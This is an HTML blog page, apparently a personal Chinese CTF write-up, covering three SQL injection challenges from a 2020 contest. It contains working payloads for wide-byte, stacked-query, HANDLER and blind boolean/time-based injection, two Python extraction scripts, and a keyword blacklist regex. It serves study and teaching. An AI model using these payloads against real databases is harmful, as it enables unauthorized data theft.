@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><meta name="generator" content="Hexo 3.9.0">
+    
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="description" content="2020新春战疫-网络安全公益赛-2">
+
+
+
+
+  <meta name="keywords" content="wp,ctf,">
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1">
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/02/22/2020新春战疫-网络安全公益赛-2/">
+
+
+<meta name="keywords" content="wp,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020新春战疫-网络安全公益赛-2">
+<meta property="og:url" content="https://glotozz.github.io/2020/02/22/2020新春战疫-网络安全公益赛-2/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2020/02/22/RoCH62yDYJNAaXI.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/02/22/Me9mDRpNOtQ63ZG.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/22/FTtMzZhwX2NJfB4.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/22/1IcJj8zd2M5QZ9q.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-22_19-16-17.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/22/vWzpKHOo52yXVj4.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/22/kycO7AmR4VHeWEX.png">
+<meta property="og:updated_time" content="2020-02-22T14:54:43.340Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2020新春战疫-网络安全公益赛-2">
+<meta name="twitter:image" content="https://i.loli.net/2020/02/22/RoCH62yDYJNAaXI.jpg">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> 2020新春战疫-网络安全公益赛-2 - glotozz'blog </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          2020新春战疫-网络安全公益赛-2
+        
+      </h1>
+
+      <time class="post-time">
+          Feb 22 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p>放上我xxxxx</p>
+<img src="https://i.loli.net/2020/02/22/RoCH62yDYJNAaXI.jpg" alt="IMG_3389_20200111-131113_.JPG" style="zoom:30%;">
+
+<h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p>看到PDO+<code>set names gbk</code> 就想到宽字节注入，之前看过的文章</p>
+<blockquote>
+<p>从宽字节注入认识PDO的原理和正确使用：<a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/216336.html</a> </p>
+</blockquote>
+<p>简单测试了下，发现可以，但是过滤了<code>select</code>，我简单测试了下发现存在堆叠注入，没有过滤<code>=</code>，万事大吉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select hex(&apos;select sleep(5)&apos;);</span><br><span class="line">set @a=0x73656C65637420736C656570283529;</span><br><span class="line">prepare smtm_test from @a;</span><br><span class="line">execute smtm_test;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&apos;;set%20@a=0x73656C65637420736C656570283529;prepare%20smtm_test%20from%20@a;execute%20smtm_test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/02/22/Me9mDRpNOtQ63ZG.png" alt="Snipaste_2020-02-22_16-55-22.png"></p>
+<p><img src="https://i.loli.net/2020/02/22/FTtMzZhwX2NJfB4.png" alt="Snipaste_2020-02-22_16-56-05.png"></p>
+<p>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># coding=utf-8</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d157325460674375820d1c51bd80f6adc9672fe83ab44e0e.changame.ichunqiu.com/?id=&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">tmp = 0</span><br><span class="line"></span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    if tmp == 1:</span><br><span class="line">        break</span><br><span class="line">    tmp = 1</span><br><span class="line">    for j in range(32, 127):</span><br><span class="line">        # payload = &quot;select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())&quot;</span><br><span class="line">        # payload = &quot;select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;table1&apos;)&quot;</span><br><span class="line">        payload = &quot;select(group_concat(fllllll4g))from(table1)&quot;</span><br><span class="line">        payload = &quot;select if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)&quot;.format(payload, i, j)</span><br><span class="line">        # print payload</span><br><span class="line">        payload = payload.encode(&apos;hex&apos;)</span><br><span class="line">        param = &quot;1&quot;+urllib.unquote(&quot;%df&quot;)+&quot;&apos;;set @a=0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;&quot;.format(payload)</span><br><span class="line">        param = urllib.quote(param)</span><br><span class="line">        # print(param)</span><br><span class="line">        try:</span><br><span class="line">            url1 = url + param</span><br><span class="line">            r = requests.get(url=url1, timeout=3)</span><br><span class="line">            if r.status_code != 200:</span><br><span class="line">                j -= 1</span><br><span class="line">                continue</span><br><span class="line">            # print(r.content.decode(&apos;utf-8&apos;))</span><br><span class="line">        except requests.exceptions.ReadTimeout as e:</span><br><span class="line">            tmp = 0</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>emm，这个黑名单似乎可以用昨天的exp打。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1&apos;and if(database() regexp&quot;^s&quot;,sleep(3),1)%23</span><br></pre></td></tr></table></figure>
+
+<p>需要先利用堆叠注入查询表和字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;show tables;#</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>FlagHere</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;; show columns from `FlagHere`; #</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>flag</code></p>
+<p><img src="https://i.loli.net/2020/02/22/1IcJj8zd2M5QZ9q.png" alt="Snipaste_2020-02-22_17-09-24.png"></p>
+<p><code>1&#39;and if((FlagHere.flag regexp&#39;^{}&#39;),sleep(5),1)%23</code></p>
+<p>还有个问题，就是利用昨天的方法只能查当前表，而flag在另一张表中。</p>
+<p>遂作罢</p>
+<hr>
+<blockquote>
+<p><a href="https://www.4hou.com/posts/mM60" target="_blank" rel="noopener">https://www.4hou.com/posts/mM60</a> </p>
+</blockquote>
+<p>骚操作：<code>handler</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]  </span><br><span class="line">  </span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)  </span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]  </span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;  </span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]  </span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;  </span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]  </span><br><span class="line">  </span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;handler FlagHere open as a;handler a READ first;#</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p>bp跑一下</p>
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-22_19-16-17.png" alt="Snipaste_2020-02-22_19-16-17"></p>
+<p>不是200就是500,500的是语法错误，其实过滤字符的并不多</p>
+<p>数字型，有回显考虑盲注，简单构造了下成了</p>
+<p><img src="https://i.loli.net/2020/02/22/vWzpKHOo52yXVj4.png" alt="Snipaste_2020-02-22_20-24-01.png"></p>
+<p>bp跑一下发现c的时候<code>Hello Nu1L</code></p>
+<p>数据库爆出来了，<code>ctf</code>,mysql版本<code>5.7.1</code></p>
+<p>发现<code>innodb</code>也被过滤。。</p>
+<blockquote>
+<p>聊一聊bypass information_schema：<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a> </p>
+<p> 前提要是mysql ≥ 5.7版本 </p>
+</blockquote>
+<p>新特性<code>sys.schema_auto_increment_columns</code>也被过滤。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from sys.schema_auto_increment_columns where table_schema=&apos;ctf&apos;</span><br></pre></td></tr></table></figure>
+
+<p>还有另一种</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer</span><br></pre></td></tr></table></figure>
+
+<p>成功得到了表名<code>users233333333333333,f1ag_1s_h3r3_hhhhh,</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
+
+<p>报500错误，说明不止1列。。。猜了几个字段也不行==！</p>
+<p>翔哥的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1,0x61)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/02/22/kycO7AmR4VHeWEX.png" alt="Snipaste_2020-02-22_22-19-55.png"></p>
+<p>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># coding=utf-8</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">url = &quot;http://f1378e453faf447696702f67444c2575579c8764a54a4e37.changame.ichunqiu.com/&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&apos;</span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">tmp = 0</span><br><span class="line"></span><br><span class="line"># for i in range(1, 100):</span><br><span class="line">#     if tmp == 1:</span><br><span class="line">#         break</span><br><span class="line">#     tmp = 1</span><br><span class="line">#     for j in range(32, 127):</span><br><span class="line">#         # payload = &quot;select version()&quot;</span><br><span class="line">#         payload = &quot;select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer&quot;</span><br><span class="line">#         param = &quot;0^(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#&quot;.format(payload, str(i), str(j))</span><br><span class="line">#         print(param)</span><br><span class="line">#         data = &#123;</span><br><span class="line">#             &apos;id&apos;: param</span><br><span class="line">#         &#125;</span><br><span class="line">#         r = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">#         # print(r.content.decode(&apos;utf-8&apos;))</span><br><span class="line">#         if &quot;Nu1L&quot; in r.content.decode(&quot;utf-8&quot;):</span><br><span class="line">#             tmp = 0</span><br><span class="line">#             flag = flag + chr(j)</span><br><span class="line">#             print(flag)</span><br><span class="line">#             break</span><br><span class="line"># print(flag)</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(32,127):</span><br><span class="line">        # param = &quot;0^((select 1,0x&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#&quot;.format((flag + chr(j)).encode(&apos;hex&apos;))</span><br><span class="line">        param = &quot;0^((select 1,concat(&apos;&#123;&#125;&apos;, CAST(&apos;0&apos; as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#&quot;.format(flag + chr(j))</span><br><span class="line">        # print param</span><br><span class="line">        data = &#123;</span><br><span class="line">            &apos;id&apos;: param</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">        if &quot;Nu1L&quot; in r.content.decode(&quot;utf-8&quot;):</span><br><span class="line">            tmp = 0</span><br><span class="line">            flag = flag + chr(j-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>有个缺陷，就是不区分大小写。。</p>
+<blockquote>
+<p> <a href="https://www.smi1e.top/新春战疫公益赛-ezsqli-出题小记/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg</a> </p>
+<p>预期解是文章中提到的使用 <code>SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON))</code> 来另其返回二进制字符串。 </p>
+</blockquote>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/wp-ctf/">wp,ctf</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2020/02/22/2020新春战疫-网络安全公益赛-1/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">2020新春战疫-网络安全公益赛-1</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2020/02/20/start/">
+        <span class="next-text nav-default">New Start</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
